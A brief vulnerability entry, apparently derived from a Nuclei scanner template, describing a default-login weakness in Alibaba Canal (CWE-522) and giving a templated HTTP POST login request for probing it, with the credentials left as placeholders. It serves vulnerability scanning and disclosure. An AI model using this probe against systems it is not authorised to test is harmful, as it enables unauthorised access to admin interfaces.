# Vulnerability: Alibaba Canal Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`canal-default-login.yaml`)

## Description
An Alibaba Canal default login was discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /api/v1/user/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"username":"{{user}}","password":"{{pass}}"}
```

